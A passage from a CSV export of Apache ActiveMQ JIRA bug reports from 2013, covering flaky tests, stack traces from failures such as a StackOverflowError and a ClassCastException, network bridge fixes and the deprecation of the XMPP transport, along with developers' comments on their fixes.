;;;","05/Apr/13 19:35;kearls;And AMQ2580Test
;;;","16/May/13 15:50;chirino;Found a thread safety issue in the leveldb imp.  Should now be fixed as of r1483369;;;","16/May/13 19:35;chirino;Have just committed a fix for LevelDBXARecoveryBrokerTest.  The topic GC was being to agressive and was GC messages which had acks that were prepared but not committed.;;;","16/May/13 19:58;chirino;Added a LevelDB version of AMQ2149Test.java.  It's working now.;;;","16/May/13 21:58;chirino;Implemented a pure LevelDB test for the StoreQueueCursorNoDuplicateTest and fix the bug that was causing it to fail.;;;","17/May/13 15:58;chirino;The bug causing ThreeBrokerVirtualTopicNetwork to fail is now fixed.;;;","22/May/13 22:06;tabish;Most look pretty good now, QueueMasterSlaveSingleUrlTest is still hanging though. ;;;","13/Jun/13 21:27;tabish;found out what was breaking the run of QueueMasterSlaveSingleUrlTest, fixed the clean settings to remove old test stores.  Works now for me on Mac and Linux.;;;","19/Jul/13 22:22;tabish;QueueBrowsingLevelDBTest is failing because the LevelDB store isn't using the Message incrementReferenceCount and decrementReferenceCount methods as KahaDB does so first three messages get added to the cursors batch list befire the memory usage exceeds the set value.  In the KahaDB versions of the test the usage exceeds the set value on send of the third message so it's not added to the Cursor's batch list and its usage drops after the store finishes its write so we can then page in one page worth of messages after the first two messages are sent to the browser.  ;;;","22/Jul/13 20:55;tabish;current set of test are passing for me now. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.transport.stomp.StompTest#testReplyToAcrossConnections mostly fails,AMQ-4291,12630355,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,gtully,gtully,01/Feb/13 11:14,01/Feb/13 19:18,14/Jul/23 05:43,01/Feb/13 19:18,5.8.0,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,"seems the receive times out.
{code}
java.net.SocketTimeoutException: Read timed out
	at java.net.SocketInputStream.socketRead0(Native Method)
	at java.net.SocketInputStream.read(SocketInputStream.java:129)
	at java.net.SocketInputStream.read(SocketInputStream.java:182)
	at java.io.DataInputStream.readByte(DataInputStream.java:248)
	at org.apache.activemq.transport.stomp.StompWireFormat.readHeaderLine(StompWireFormat.java:155)
	at org.apache.activemq.transport.stomp.StompWireFormat.readLine(StompWireFormat.java:148)
	at org.apache.activemq.transport.stomp.StompWireFormat.parseAction(StompWireFormat.java:181)
	at org.apache.activemq.transport.stomp.StompWireFormat.unmarshal(StompWireFormat.java:98)
	at org.apache.activemq.transport.stomp.StompConnection.receive(StompConnection.java:77)
	at org.apache.activemq.transport.stomp.StompConnection.receive(StompConnection.java:68)
	at org.apache.activemq.transport.stomp.StompTest.doReplyToAcrossConnections(StompTest.java:2107)
	at org.apache.activemq.transport.stomp.StompTest.testReplyToAcrossConnections(StompTest.java:2070)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26)
	at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27)
	at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55)
	at org.junit.rules.RunRules.evaluate(RunRules.java:20)
	at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50)
	at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236)
	at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:309)
	at org.junit.runner.JUnitCore.run(JUnitCore.java:160)
	at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:76)
	at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:195)
	at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:63)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120){code}",,donnchadh,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,310850,,,Fri Feb 01 19:18:39 UTC 2013,,,,,,,,,,,"0|i1hn9j:",311195,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"01/Feb/13 19:18;tabish;Fixed, the subscribe to the request destination was missing a receipt request so in the topic case we could miss the request message.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-perf-maven-plugin is unusable because of bug in ReflectionUtil helper class,AMQ-4289,12630245,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,ceposta,ceposta,01/Feb/13 00:00,01/Feb/13 00:26,14/Jul/23 05:43,01/Feb/13 00:26,5.8.0,,,,,,,,Performance Test,,,,0,maven-activemq-perf-plugin,,,,,,,,"End up getting stack overflow for recursive call in ReflectionUtil.retrieveClassProperties()... if there is a getter that returns itself, it will not check that the ""targetObject"" which it's inspecting is the same as what an identity getter would return. For example, RedeliveryPolicy has a method:

getValue() {
return this;
}

which causes this stack trace:

java.lang.StackOverflowError
	at java.io.FileOutputStream.writeBytes(Native Method)
	at java.io.FileOutputStream.write(FileOutputStream.java:282)
	at java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:65)
	at java.io.BufferedOutputStream.flush(BufferedOutputStream.java:123)
	at java.io.PrintStream.flush(PrintStream.java:288)
	at com.intellij.rt.execution.junit.segments.SegmentedOutputStream.flush(SegmentedOutputStream.java:48)
	at com.intellij.rt.execution.junit.segments.SegmentedOutputStream.write(SegmentedOutputStream.java:44)
	at java.io.OutputStream.write(OutputStream.java:99)
	at java.io.PrintStream.write(PrintStream.java:430)
	at sun.nio.cs.StreamEncoder.writeBytes(StreamEncoder.java:202)
	at sun.nio.cs.StreamEncoder.implFlushBuffer(StreamEncoder.java:272)
	at sun.nio.cs.StreamEncoder.flushBuffer(StreamEncoder.java:85)
	at java.io.OutputStreamWriter.flushBuffer(OutputStreamWriter.java:168)
	at java.io.PrintStream.write(PrintStream.java:477)
	at java.io.PrintStream.print(PrintStream.java:619)
	at java.io.PrintStream.println(PrintStream.java:773)
	at java.lang.Throwable.printStackTrace(Throwable.java:461)
	at java.lang.Throwable.printStackTrace(Throwable.java:451)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:229)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218)
	at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUt",,ceposta,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,310741,,,Fri Feb 01 00:26:40 UTC 2013,,,,,,,,,,,"0|i1hmlb:",311086,,,,,,,,,,,,,,,,,,,,,"01/Feb/13 00:02;ceposta;Fix on trunk with r1441270;;;","01/Feb/13 00:11;tabish;Double check your commit, looks like you might have commented out the fix ;);;;","01/Feb/13 00:26;ceposta;Yep! Nice catch!

Fix with r1441277;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
OptimizedAckTest fails intermittently,AMQ-4288,12630176,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,31/Jan/13 17:24,31/Jan/13 19:36,14/Jul/23 05:43,31/Jan/13 19:36,,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,Both the testVerySlowReceivedMessageStillInflight and testReceivedMessageNotInFlightAfterScheduledAckFires tests fail.,,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Jan/13 17:26;kearls;AMQ4288.patch;https://issues.apache.org/jira/secure/attachment/12567393/AMQ4288.patch","31/Jan/13 17:31;kearls;AMQ4288A.patch;https://issues.apache.org/jira/secure/attachment/12567395/AMQ4288A.patch","31/Jan/13 19:21;kearls;AMQ4288B.patch;https://issues.apache.org/jira/secure/attachment/12567418/AMQ4288B.patch",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,310672,,,Thu Jan 31 19:36:32 UTC 2013,,,,,,,Patch Available,,,,"0|i1hm5z:",311017,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"31/Jan/13 17:26;kearls;Fixed (? or at least improved) a race condition in both test cases which occurred intermittently on slower machines.
  ;;;","31/Jan/13 17:31;kearls;Updated to include the save fix for the testReceivedMessageStillInflight test.
;;;","31/Jan/13 17:50;tabish;Still seeing failures on my old Mac;;;","31/Jan/13 19:21;kearls;Updated the test to wait for acks to finish after receiving the 7th message.  This should eliminate the race condition the tests were hitting before.;;;","31/Jan/13 19:36;tabish;Thanks, passing now repeatedly on my old mac. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NetworkFailoverTest failing ,AMQ-4285,12629949,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,tabish,tabish,30/Jan/13 17:39,31/Jan/13 14:19,14/Jul/23 05:43,31/Jan/13 14:19,5.7.0,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,"The test case NetworkFailoverTest is failing most times on my machine, will fail more often if the message count value is increased. ",,gtully,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,310445,,,Thu Jan 31 14:19:44 UTC 2013,,,,,,,,,,,"0|i1hkrr:",310790,,,,,,,,,,,,,,,,,,,,,"31/Jan/13 14:19;gtully;it looks better now.

there are a bunch of pitfalls of request/reply with temps over a network.

temps are not persistent and are tied to the connection that creates them so  failures can occur when a connection fails.

some appropriate mods to the test

- backup=false in failover - otherwise there is a race between failover restore and broker teardown of the old connection.
 -- we can loose a replayed temp dest, if it arrives before the remove is complete.

- Broker.setCacheTempDestinations - this helps with reply that occur before the destination is removed during failover. the cache keeps the message (a form of temp persistence)

- tracking DestinationDoesNotExistException - a reply may fail if it occurs during failover recovery

- tracking dlq due to failed forwards that result from DestinationDoesNotExistException;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 conditionalNetworkBridgeFilterFactory ignores NetworkTTL ,AMQ-4283,12629894,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,30/Jan/13 13:47,30/Jan/13 13:53,14/Jul/23 05:43,30/Jan/13 13:53,5.7.0,,,,,5.8.0,,,Broker,,,,0,networkbridge,networkttl,replay,,,,,,"when the conditionalNetworkBridgeFilterFactory is configured via a policy entry, it bypasses the networkttl check in error. allowing messages to hop in error a cross linked/looped brokers.
The networkTtl should only be ignored when replaying back to the origin.
also, the rate limit should be applied in all cases.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,310390,,,Wed Jan 30 13:53:23 UTC 2013,,,,,,,,,,,"0|i1hkfj:",310735,,,,,,,,,,,,,,,,,,,,,"30/Jan/13 13:52;gtully;came across this in the logs, fixed also{code}java.lang.ClassCastException: org.apache.activemq.broker.region.IndirectMessageReference cannot be cast to org.apache.activemq.command.Message
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.destroy(FilePendingMessageCursor.java:159)
	at org.apache.activemq.broker.region.TopicSubscription.destroy(TopicSubscription.java:645)
	at org.apache.activemq.broker.region.AbstractRegion.destroySubscription(AbstractRegion.java:391)
	at org.apache.activemq.broker.jmx.ManagedTopicRegion.destroySubscription(ManagedTopicRegion.java:52)
	at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:383)
	at org.apache.activemq.broker.region.TopicRegion.removeConsumer(TopicRegion.java:176)
	at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:364)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.removeConsumer(ManagedRegionBroker.java:247)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:253)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:123)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:123)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:651)
	at org.apache.activemq.broker.TransportConnection.processRemoveSession(TransportConnection.java:690)
	at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:806)
	at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:1146)
	at org.apache.activemq.broker.TransportConnection$4.run(TransportConnection.java:1076)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680){code};;;","30/Jan/13 13:53;gtully;fix in http://svn.apache.org/viewvc?rev=1440415&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deadlock in test BrokerNetworkwithStuckMessageTest,AMQ-4282,12629711,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,29/Jan/13 15:59,29/Jan/13 17:53,14/Jul/23 05:43,29/Jan/13 17:53,5.8.0,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,Test is hanging on my Mac,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jan/13 16:00;tabish;runner-log.txt;https://issues.apache.org/jira/secure/attachment/12566993/runner-log.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,310207,,,Tue Jan 29 17:53:43 UTC 2013,,,,,,,,,,,"0|i1hjav:",310552,,,,,,,,,,,,,,,,,,,,,"29/Jan/13 16:00;tabish;captured a thread dump from the hung test;;;","29/Jan/13 17:53;tabish;Added fix in trunk to prevent the deadlock when the advisory consumer subscription was getting set as sync dispatch.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQConnectionFactoryTest fails intermittently,AMQ-4281,12629704,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,29/Jan/13 15:27,29/Jan/13 17:31,14/Jul/23 05:43,29/Jan/13 17:31,,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,"This depends on the order the tests are run in.  testConnectionFailsToConnectToVMBrokerThatIsNotRunning will fail if it is run after either testSetExceptionListener or testSetClientInternalExceptionListener.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jan/13 15:29;kearls;AMQ4281.patch;https://issues.apache.org/jira/secure/attachment/12566990/AMQ4281.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,310200,,,Tue Jan 29 17:31:50 UTC 2013,,,,,,,Patch Available,,,,"0|i1hj9b:",310545,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"29/Jan/13 15:29;kearls;Updated testSetExceptionListener and testSetClientInternalExceptionListener to close connections.;;;","29/Jan/13 17:31;tabish;Patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
deprecate xmpp transport,AMQ-4278,12629543,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,gtully,gtully,28/Jan/13 15:50,28/Jan/13 15:59,14/Jul/23 05:43,28/Jan/13 15:59,5.8.0,,,,,5.8.0,,,Transport,,,,1,,,,,,,,,"time to cut this transport loose, no real users in the wild",,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,310039,,,Mon Jan 28 15:59:40 UTC 2013,,,,,,,,,,,"0|i1hi9j:",310384,,,,,,,,,,,,,,,,,,,,,"28/Jan/13 15:59;tabish;Done, marked the Transport classes as deprecated.  Should drop this in v5.9.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Don't restart the network bridge on race condition where respondent sends to a temp dest that has just been deleted,AMQ-4276,12629320,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,25/Jan/13 21:12,18/Feb/13 15:24,14/Jul/23 05:43,25/Jan/13 21:53,5.7.0,,,,,5.8.0,,,,,,,0,networkBridge,request-reply,temp,topic,,,,,"request reply with temp destinations can lead to forwarding exceptions in a network bridge, which tears down the bridge.
because this can happen in normal operation; a respondent replying after an initiator has given up waiting for a reply, the bridge should be able to log and survive.

Assume a network of brokers between three brokers: A <===> B <===> C
a client on C creates a temporary destination, assigns that as a reply-to in a message then sends the message.
a client on A consumes the message and will send back a response to the temporary destination. after the response has been sent, the client on C goes away which will cause the temporary destination to go away. the advisory to remove the temporary destination will get to B before the response from the client on A gets to B. When the response finally does get to B, the temporary destination will no longer be there and will be considered invalid. It will throw a JMSException of Destination Does not Exist.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4328,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,309468,,,Fri Jan 25 21:53:12 UTC 2013,,,,,,,,,,,"0|i1faw7:",297526,,,,,,,,,,,,,,,,,,,,,"25/Jan/13 21:53;gtully;fix in http://svn.apache.org/viewvc?rev=1438734&view=rev

duplex case needed a second vm connection to avoid deadlock between forwarding in both directions when replies are required.

a poison ack is used on a forward failure and for topics, b/c we don't have the message to dlq, there is an advisory hook.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"maven plugin goal ""activemq:run"" cannot run in latest 5.8 snapshot",AMQ-4275,12629149,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,ceposta,ceposta,24/Jan/13 21:04,24/Jan/13 21:17,14/Jul/23 05:43,24/Jan/13 21:17,5.8.0,,,,,5.8.0,,,,,,,0,maven,,,,,,,,"Running activemq:run gives this error:
[ERROR] Failed to execute goal org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run (default-cli) on project example: Unable to parse configuration of mojo org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run for parameter project: Cannot configure instance of org.apache.maven.project.MavenProject from ${${project}} -> [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run (default-cli) on project example: Unable to parse configuration of mojo org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run for parameter project: Cannot configure instance of org.apache.maven.project.MavenProject from ${${project}}
	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:221)
	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
	at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
	at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
